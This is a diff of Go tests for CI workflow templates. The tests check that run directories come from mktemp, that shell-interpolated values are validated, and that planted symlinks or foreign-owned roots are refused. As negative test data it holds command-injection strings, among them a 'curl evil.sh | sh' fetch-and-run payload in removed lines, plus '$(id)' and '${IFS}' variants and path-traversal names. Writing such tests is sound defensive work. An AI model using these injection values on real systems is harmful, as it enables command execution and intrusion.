@@ -8,13 +8,14 @@ package templates
 // never gate without a base commit.
 
 import (
-	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"regexp"
 	"strings"
+	"sync"
 	"testing"
+	"time"
 
 	"gopkg.in/yaml.v3"
 
@@ -78,10 +79,10 @@ var templateAction = regexp.MustCompile(`'?\{\{\s*(.*?)\s*\}\}'?`)
 // checked by facts.valid or resolved.ok before any run node can run.
 var checkedValues = map[string]bool{
 	"nodes.facts.tier": true, "nodes.facts.sha": true, "nodes.facts.base": true,
-	"nodes.facts.default_branch": true, "nodes.facts.run": true, "nodes.facts.path": true,
-	"nodes.resolved.base": true, "nodes.resolved.prefix": true,
-	// finally's cleanup may run when facts did not (a cancel before it).
-	"nodes.?facts.run.orValue('')": true, "nodes.?facts.path.orValue('')": true,
+	"nodes.facts.default_branch": true, "nodes.facts.path": true,
+	"nodes.resolved.base": true, "nodes.resolved.prefix": true, "nodes.resolved.run": true,
+	// finally's cleanup may run when resolved did not (a cancel before it).
+	"nodes.?resolved.run.orValue('')": true,
 }
 
 // Every value a run node's command interpolates is a checked one, inside
@@ -124,32 +125,36 @@ func TestReliantCI_ShellsInterpolateOnlyCheckedQuotedValues(t *testing.T) {
 	if got := doc.node(t, "cleanup").Args.WorkDir; got != "{{ nodes.?resolved.root.orValue('') }}" {
 		t.Errorf("cleanup work_dir = %q, want the run directories' parent", got)
 	}
+	// The run directory is mktemp's, reported by fetch: never derived from
+	// the chat id, which two runs can share.
+	if raw, err := CITemplates("reliant").Render("ci.yaml.tmpl", ReliantCIWorkflowData{Check: "demo/ci"}); err != nil {
+		t.Fatal(err)
+	} else if strings.Contains(string(raw), "chat_id") {
+		t.Error("ci.yaml reads workflow.chat_id: a run directory or ref named by it is shared by runs of one chat")
+	}
+	fetch := doc.node(t, "fetch").Args.Command
+	for _, want := range []string{`mktemp -d "$root/run.XXXXXXXX"`, `find -P "$root" -mindepth 1 -maxdepth 1 -type d -user "$uid" -name 'run.*' -mtime +2`, `-perm 700`} {
+		if !strings.Contains(fetch, want) {
+			t.Errorf("fetch lacks %q", want)
+		}
+	}
+	if strings.Contains(fetch, "-exec rm") {
+		t.Error("fetch deletes what find matched without checking each directory")
+	}
 	if doc.node(t, "gate").Args.Credentials != "none" || doc.node(t, "cleanup").Args.Credentials != "none" {
 		t.Error("gate and cleanup must run with credentials: none")
 	}
 }
 
-// facts.valid refuses a run id or project path that could break out of the
-// single quotes, or otherwise mean something to a shell.
+// facts.valid refuses a project path that could break out of the single
+// quotes, or otherwise mean something to a shell.
 func TestReliantCI_FactsRefuseShellSyntax(t *testing.T) {
 	valid := renderReliantCI(t).node(t, "facts").Outputs["valid"]
-	pattern := func(field string) *regexp.Regexp {
-		m := regexp.MustCompile(regexp.QuoteMeta(field) + `\.matches\('([^']+)'\)`).FindStringSubmatch(valid)
-		if m == nil {
-			t.Fatalf("facts.valid does not check %s against a pattern:\n%s", field, valid)
-		}
-		return regexp.MustCompile(m[1]) // RE2, as CEL's matches is
+	m := regexp.MustCompile(`workflow\.path\.matches\('([^']+)'\)`).FindStringSubmatch(valid)
+	if m == nil {
+		t.Fatalf("facts.valid does not check workflow.path against a pattern:\n%s", valid)
 	}
-	run, path := pattern("workflow.chat_id"), pattern("workflow.path")
-	hostile := []string{"", "a'b", "a;id", "$(id)", "`id`", "a\nb", "a b", "x' && curl evil.sh | sh #", "../x", "a$b"}
-	for _, v := range hostile {
-		if run.MatchString(v) {
-			t.Errorf("a run id %q passes facts.valid", v)
-		}
-	}
-	if !run.MatchString("4b0e7c4e-2f1a-4c4b-9a1e-3f2d1c0b9a8e") {
-		t.Error("a UUID run id is refused")
-	}
+	path := regexp.MustCompile(m[1]) // RE2, as CEL's matches is
 	for _, v := range []string{"relative/dir", "/a'b", "/a\nb", "/$(id)", "/`id`", "/a;b", "/a\"b"} {
 		if path.MatchString(v) {
 			t.Errorf("a project path %q passes facts.valid", v)
@@ -160,8 +165,22 @@ func TestReliantCI_FactsRefuseShellSyntax(t *testing.T) {
 			t.Errorf("project path %q is refused", v)
 		}
 	}
-	if !strings.Contains(valid, "workflow.chat_id.matches(") || !strings.Contains(valid, "inputs.tier in [") {
-		t.Errorf("facts.valid does not check the run id and the tier:\n%s", valid)
+	if !strings.Contains(valid, "inputs.tier in [") {
+		t.Errorf("facts.valid does not check the tier:\n%s", valid)
+	}
+	// resolved accepts only a run directory named as mktemp names it.
+	m = regexp.MustCompile(`\^run=\(([^)]+)\)\$`).FindStringSubmatch(renderReliantCI(t).node(t, "resolved").Outputs["run"])
+	if m == nil {
+		t.Fatal("resolved.run does not extract a run directory by a pattern")
+	}
+	run := regexp.MustCompile("^" + m[1] + "$")
+	for _, v := range []string{"run.", "run.abc", "run.abcdefgh/../x", "run.abcd'fgh", "../run.abcdefgh", "run.abcdefghi", "x/run.abcdefgh", "run.abcd$(id)"} {
+		if run.MatchString(v) {
+			t.Errorf("run directory %q passes resolved", v)
+		}
+	}
+	if !run.MatchString("run.Ab3dE6gH") {
+		t.Errorf("resolved's run pattern %s refuses mktemp's run.Ab3dE6gH", run)
 	}
 }
 
@@ -271,79 +290,308 @@ func (f ciFixture) run(t *testing.T, dir, body string, env ...string) (stdout, s
 	return strings.TrimSpace(o.String()), e.String(), code
 }
 
-func (f ciFixture) fetch(t *testing.T, tier, base, branch, runID string) (map[string]string, string, int) {
+func (f ciFixture) fetch(t *testing.T, tier, base, branch string, env ...string) (map[string]string, string, int) {
 	t.Helper()
-	return f.fetchIn(t, filepath.Join(f.checkout, "sub"), tier, base, branch, runID)
+	return f.fetchIn(t, filepath.Join(f.checkout, "sub"), tier, base, branch, env...)
 }
 
-func (f ciFixture) fetchIn(t *testing.T, project, tier, base, branch, runID string) (map[string]string, string, int) {
+func (f ciFixture) fetchIn(t *testing.T, project, tier, base, branch string, env ...string) (map[string]string, string, int) {
 	t.Helper()
 	out, errOut, code := f.run(t, f.tmp, script(t, "fetch", map[string]string{
 		"nodes.facts.tier": tier, "nodes.facts.sha": f.head, "nodes.facts.base": base,
-		"nodes.facts.default_branch": branch, "nodes.facts.run": runID, "nodes.facts.path": project,
-	}))
+		"nodes.facts.default_branch": branch, "nodes.facts.path": project,
+	}), env...)
+	return parseLines(out), errOut, code
+}
+
+func parseLines(out string) map[string]string {
 	lines := map[string]string{}
 	for _, l := range strings.Split(out, "\n") {
 		if k, v, ok := strings.Cut(l, "="); ok {
 			lines[k] = v
 		}
 	}
-	return lines, errOut, code
+	return lines
 }
 
+// cleanup runs finally's cleanup as the engine would: in the root, for the
+// run directory fetch reported.
+func (f ciFixture) cleanup(t *testing.T, run string) {
+	t.Helper()
+	if _, errOut, code := f.run(t, f.root(), script(t, "cleanup", map[string]string{"nodes.?resolved.run.orValue('')": run})); code != 0 {
+		t.Fatalf("cleanup: exit %d\n%s", code, errOut)
+	}
+}
+
+func (f ciFixture) root() string { return filepath.Join(f.cache, "reliant-ci") }
+
+func exists(path string) bool {
+	_, err := os.Lstat(path)
+	return err == nil
+}
+
+var mktempRun = regexp.MustCompile(`^run\.[A-Za-z0-9]{8}$`)
+
 // The fetch step, run for real against a local origin: the pr and queue
-// tiers fail with a clear message when their base does not resolve, main
-// needs none, and a run id that is not [A-Za-z0-9-]+ is refused by the shell
-// as well (should facts ever let one through).
+// tiers fail with a clear message when their base does not resolve, and
+// main needs none.
 func TestReliantCI_FetchRefusesAMissingBase(t *testing.T) {
 	testkit.Slow(t, "execs git and bash")
 	f := newCIFixture(t)
-	root := filepath.Join(f.cache, "reliant-ci")
 
-	if out, errOut, code := f.fetch(t, "pr", f.base, "main", "run-1"); code != 0 || out["base"] != f.base || out["root"] != root || out["prefix"] != "./sub/" {
-		t.Errorf("pr with a base: exit %d, out %v (want base %s, root %s, prefix ./sub/)\n%s", code, out, f.base, root, errOut)
+	out, errOut, code := f.fetch(t, "pr", f.base, "main")
+	if code != 0 || out["base"] != f.base || out["root"] != f.root() || out["prefix"] != "./sub/" || !mktempRun.MatchString(out["run"]) {
+		t.Fatalf("pr with a base: exit %d, out %v (want base %s, root %s, prefix ./sub/, a run.XXXXXXXX)\n%s", code, out, f.base, f.root(), errOut)
 	}
-	if _, err := os.Stat(filepath.Join(root, "run-1", "head.bundle")); err != nil {
-		t.Errorf("fetch wrote no bundle: %v", err)
+	if !exists(filepath.Join(f.root(), out["run"], "head.bundle")) || !exists(filepath.Join(f.root(), out["run"], ".reliant-ci-run")) {
+		t.Error("fetch wrote no bundle or no marker")
+	}
+	if fi, err := os.Stat(f.root()); err != nil || fi.Mode().Perm() != 0o700 {
+		t.Errorf("the root is not mode 0700: %v %v", fi.Mode(), err)
 	}
 	if refs := git(t, f.checkout, "for-each-ref", "refs/reliant-ci"); refs != "" {
 		t.Errorf("fetch left its refs in the checkout: %q", refs)
 	}
 	// No base given: the default branch's tip (here head) is the base.
-	if out, errOut, code := f.fetch(t, "pr", "", "main", "run-2"); code != 0 || out["base"] != f.head {
+	if out, errOut, code := f.fetch(t, "pr", "", "main"); code != 0 || out["base"] != f.head {
 		t.Errorf("pr with no base: exit %d, out %v\n%s", code, out, errOut)
 	}
 	// A merge group's base must be an ancestor of the group.
-	if out, errOut, code := f.fetch(t, "queue", f.base, "main", "run-q"); code != 0 || out["base"] != f.base {
+	if out, errOut, code := f.fetch(t, "queue", f.base, "main"); code != 0 || out["base"] != f.base {
 		t.Errorf("queue with its base: exit %d, out %v\n%s", code, out, errOut)
 	}
+	before, _ := os.ReadDir(f.root())
 	missing := strings.Repeat("0", 39) + "1"
-	for i, tc := range []struct{ name, tier, base, branch, want string }{
+	for _, tc := range []struct{ name, tier, base, branch, want string }{
 		{"pr, base not on origin", "pr", missing, "main", "tier needs"},
 		{"queue, base not on origin", "queue", missing, "main", "tier needs"},
 		{"pr, no base and no default branch", "pr", "", "no-such-branch", "tier needs"},
 		{"queue, base not an ancestor of the group", "queue", f.side, "main", "is not an ancestor"},
 	} {
-		_, errOut, code := f.fetch(t, tc.tier, tc.base, tc.branch, fmt.Sprintf("bad-%d", i))
+		_, errOut, code := f.fetch(t, tc.tier, tc.base, tc.branch)
 		if code == 0 || !strings.Contains(errOut, tc.want) {
 			t.Errorf("%s: exit %d, want a failure that says %q:\n%s", tc.name, code, tc.want, errOut)
 		}
-		if _, err := os.Stat(filepath.Join(root, fmt.Sprintf("bad-%d", i))); err == nil {
-			t.Errorf("%s: a failed fetch left its run directory", tc.name)
-		}
 	}
-	if out, errOut, code := f.fetch(t, "main", "", "main", "run-3"); code != 0 || out["base"] != "" || out["root"] != root {
+	if after, _ := os.ReadDir(f.root()); len(after) != len(before) {
+		t.Errorf("failed fetches left run directories: %d before, %d after", len(before), len(after))
+	}
+	if out, errOut, code := f.fetch(t, "main", "", "main"); code != 0 || out["base"] != "" || out["root"] != f.root() {
 		t.Errorf("main with no base: exit %d, out %v (want success and no base)\n%s", code, out, errOut)
 	}
 	// A project at the repository's root: the prefix is ./, never empty.
-	if out, errOut, code := f.fetchIn(t, f.checkout, "main", "", "main", "run-4"); code != 0 || out["prefix"] != "./" {
+	if out, errOut, code := f.fetchIn(t, f.checkout, "main", "", "main"); code != 0 || out["prefix"] != "./" {
 		t.Errorf("a project at the repository root: exit %d, out %v (want prefix ./)\n%s", code, out, errOut)
 	}
-	if _, errOut, code := f.fetch(t, "main", "", "main", "x;touch${IFS}pwned"); code == 0 || !strings.Contains(errOut, "refused: run id") {
-		t.Errorf("a hostile run id: exit %d, want refused:\n%s", code, errOut)
+}
+
+// Two runs at once (the same chat, or any two) get distinct run directories,
+// and cleaning up one leaves the other.
+func TestReliantCI_ConcurrentRunsGetTheirOwnDirectories(t *testing.T) {
+	testkit.Slow(t, "execs git and bash")
+	f := newCIFixture(t)
+	type result struct {
+		out    map[string]string
+		errOut string
+		code   int
 	}
-	if _, err := os.Stat(filepath.Join(f.tmp, "pwned")); err == nil {
-		t.Error("a hostile run id ran a command")
+	// Rendered here: a goroutine must not call t.Fatal.
+	body := script(t, "fetch", map[string]string{
+		"nodes.facts.tier": "pr", "nodes.facts.sha": f.head, "nodes.facts.base": f.base,
+		"nodes.facts.default_branch": "main", "nodes.facts.path": filepath.Join(f.checkout, "sub"),
+	})
+	results := make(chan result, 2)
+	var wg sync.WaitGroup
+	for range 2 {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			cmd := exec.Command("bash", "-c", body)
+			cmd.Dir = f.tmp
+			cmd.Env = append(os.Environ(), "HOME="+f.tmp, "XDG_CACHE_HOME="+f.cache)
+			var o, e strings.Builder
+			cmd.Stdout, cmd.Stderr = &o, &e
+			code := 0
+			if err := cmd.Run(); err != nil {
+				code = -1
+				if ee, ok := err.(*exec.ExitError); ok {
+					code = ee.ExitCode()
+				}
+				e.WriteString(err.Error())
+			}
+			results <- result{parseLines(strings.TrimSpace(o.String())), e.String(), code}
+		}()
+	}
+	wg.Wait()
+	close(results)
+	var runs []string
+	for r := range results {
+		if r.code != 0 {
+			t.Fatalf("a concurrent fetch failed: exit %d\n%s", r.code, r.errOut)
+		}
+		runs = append(runs, r.out["run"])
+	}
+	if runs[0] == runs[1] {
+		t.Fatalf("two runs share the run directory %s", runs[0])
+	}
+	f.cleanup(t, runs[0])
+	if exists(filepath.Join(f.root(), runs[0])) {
+		t.Error("cleanup left its own run directory")
+	}
+	if !exists(filepath.Join(f.root(), runs[1], "head.bundle")) {
+		t.Error("cleaning up one run removed the other's directory")
+	}
+}
+
+// A symlink at the root, a root another user owns, a root with a looser mode,
+// and a run directory that is a symlink are refused: nothing is written
+// through them and nothing they point at is deleted.
+func TestReliantCI_RefusesPlantedRootsAndRunDirectories(t *testing.T) {
+	testkit.Slow(t, "execs git and bash")
+	f := newCIFixture(t)
+	victim := filepath.Join(f.tmp, "victim")
+	if err := os.MkdirAll(filepath.Join(victim, "run.Ab3dE6gH"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(victim, "keep"), []byte("x"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(f.cache, 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	// The root is a symlink.
+	if err := os.Symlink(victim, f.root()); err != nil {
+		t.Fatal(err)
+	}
+	if _, errOut, code := f.fetch(t, "main", "", "main"); code == 0 || !strings.Contains(errOut, "refused:") {
+		t.Errorf("a symlinked root: exit %d, want refused\n%s", code, errOut)
+	}
+	if entries, _ := os.ReadDir(victim); len(entries) != 2 {
+		t.Errorf("fetch wrote through a symlinked root: %v", entries)
+	}
+	if err := os.Remove(f.root()); err != nil {
+		t.Fatal(err)
+	}
+
+	// The root has a looser mode than 0700.
+	if err := os.Mkdir(f.root(), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(f.root(), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if _, errOut, code := f.fetch(t, "main", "", "main"); code == 0 || !strings.Contains(errOut, "mode 0700") {
+		t.Errorf("a 0755 root: exit %d, want refused\n%s", code, errOut)
+	}
+	if err := os.Chmod(f.root(), 0o700); err != nil {
+		t.Fatal(err)
+	}
+
+	// The root is another user's: simulated with an id that answers another
+	// uid, since a test cannot chown.
+	bin := filepath.Join(f.tmp, "fake-id")
+	if err := os.MkdirAll(bin, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(bin, "id"), []byte("#!/bin/sh\necho 4242\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if _, errOut, code := f.fetch(t, "main", "", "main", "PATH="+bin+":"+os.Getenv("PATH")); code == 0 || !strings.Contains(errOut, "owned by uid 4242") {
+		t.Errorf("a root another uid owns: exit %d, want refused\n%s", code, errOut)
+	}
+
+	// A run directory that is a symlink: cleanup leaves it and its target.
+	planted := filepath.Join(f.root(), "run.Ab3dE6gH")
+	if err := os.Symlink(filepath.Join(victim, "run.Ab3dE6gH"), planted); err != nil {
+		t.Fatal(err)
+	}
+	f.cleanup(t, "run.Ab3dE6gH")
+	if !exists(planted) || !exists(filepath.Join(victim, "run.Ab3dE6gH")) {
+		t.Error("cleanup removed a symlinked run directory or what it points at")
+	}
+	// Nor does cleanup take a name that is not a run directory.
+	if err := os.Mkdir(filepath.Join(f.root(), "precious"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	for _, name := range []string{"precious", "../victim", "run.Ab3dE6g", "run.Ab3dE6gH/.."} {
+		f.cleanup(t, name)
+	}
+	if !exists(filepath.Join(f.root(), "precious")) || !exists(filepath.Join(victim, "keep")) {
+		t.Error("cleanup removed something that is not a run directory")
+	}
+}
+
+// The stale sweep removes only run.XXXXXXXX directories this user owns,
+// that carry the marker and are older than two days: never a fresh one, an
+// unmarked one, a symlink, a differently named one, or (with an id that
+// answers another uid) any of them.
+func TestReliantCI_StaleSweepRemovesOnlyMarkedOldRunDirectories(t *testing.T) {
+	testkit.Slow(t, "execs git and bash")
+	f := newCIFixture(t)
+	if err := os.MkdirAll(f.root(), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(f.root(), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	old := time.Now().Add(-72 * time.Hour)
+	mk := func(name string, marked bool, mtime time.Time) string {
+		d := filepath.Join(f.root(), name)
+		if err := os.MkdirAll(d, 0o700); err != nil {
+			t.Fatal(err)
+		}
+		if marked {
+			if err := os.WriteFile(filepath.Join(d, ".reliant-ci-run"), []byte(name+"\n"), 0o600); err != nil {
+				t.Fatal(err)
+			}
+		}
+		if err := os.Chtimes(d, mtime, mtime); err != nil {
+			t.Fatal(err)
+		}
+		return d
+	}
+	stale := mk("run.OLDmark1", true, old)
+	unmarked := mk("run.OLDnomk1", false, old)
+	fresh := mk("run.NEWmark1", true, time.Now())
+	other := mk("cache-of-something", true, old)
+	target := filepath.Join(f.tmp, "target")
+	if err := os.MkdirAll(target, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(target, ".reliant-ci-run"), nil, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	link := filepath.Join(f.root(), "run.LINKmrk1")
+	if err := os.Symlink(target, link); err != nil {
+		t.Fatal(err)
+	}
+
+	// As another uid, nothing is this user's: the sweep removes nothing (and
+	// the root, not this user's either, is refused).
+	bin := filepath.Join(f.tmp, "fake-id")
+	if err := os.MkdirAll(bin, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(bin, "id"), []byte("#!/bin/sh\necho 4242\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	f.fetch(t, "main", "", "main", "PATH="+bin+":"+os.Getenv("PATH"))
+	if !exists(stale) {
+		t.Error("the sweep removed a directory another uid owns")
+	}
+
+	out, errOut, code := f.fetch(t, "main", "", "main")
+	if code != 0 {
+		t.Fatalf("fetch: exit %d\n%s", code, errOut)
+	}
+	if exists(stale) {
+		t.Error("the sweep left a marked run directory older than two days")
+	}
+	for name, d := range map[string]string{"unmarked": unmarked, "fresh": fresh, "differently named": other, "symlink": link, "symlink target": target, "this run's": filepath.Join(f.root(), out["run"])} {
+		if !exists(d) {
+			t.Errorf("the sweep removed the %s directory %s", name, d)
+		}
 	}
 }
 
@@ -355,7 +603,7 @@ func TestReliantCI_FetchRefusesAMissingBase(t *testing.T) {
 func TestReliantCI_GateRepositoryIsIsolatedFromTheCheckout(t *testing.T) {
 	testkit.Slow(t, "execs git and bash")
 	f := newCIFixture(t)
-	out, errOut, code := f.fetch(t, "pr", f.base, "main", "run-1")
+	out, errOut, code := f.fetch(t, "pr", f.base, "main")
 	if code != 0 {
 		t.Fatalf("fetch: exit %d\n%s", code, errOut)
 	}
@@ -387,10 +635,17 @@ echo '{"schema":"forge.ci.gate/v1","ok":true,"verdict":"pass","checks":[]}'
 	if err := os.WriteFile(filepath.Join(bin, "reliant"), []byte(stub), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	runDir := filepath.Join(out["root"], "run-1")
-	stdout, gateErr, code := f.run(t, runDir, script(t, "gate", map[string]string{
-		"nodes.facts.tier": "pr", "nodes.facts.sha": f.head, "nodes.resolved.base": out["base"], "nodes.resolved.prefix": out["prefix"],
-	}), "PATH="+bin+":"+os.Getenv("PATH"), "REPORT="+report)
+	gate := func(dir string) (string, string, int) {
+		return f.run(t, dir, script(t, "gate", map[string]string{
+			"nodes.facts.tier": "pr", "nodes.facts.sha": f.head, "nodes.resolved.base": out["base"],
+			"nodes.resolved.prefix": out["prefix"], "nodes.resolved.run": out["run"],
+		}), "PATH="+bin+":"+os.Getenv("PATH"), "REPORT="+report)
+	}
+	// Started anywhere but its run directory, it refuses.
+	if stdout, _, _ := gate(f.tmp); !strings.Contains(stdout, "not in its run directory") {
+		t.Errorf("a gate outside its run directory ran: %s", stdout)
+	}
+	stdout, gateErr, code := gate(filepath.Join(out["root"], out["run"]))
 	if code != 0 || !strings.Contains(stdout, `"ok":true`) {
 		t.Fatalf("gate: exit %d, stdout %q\n%s", code, stdout, gateErr)
 	}
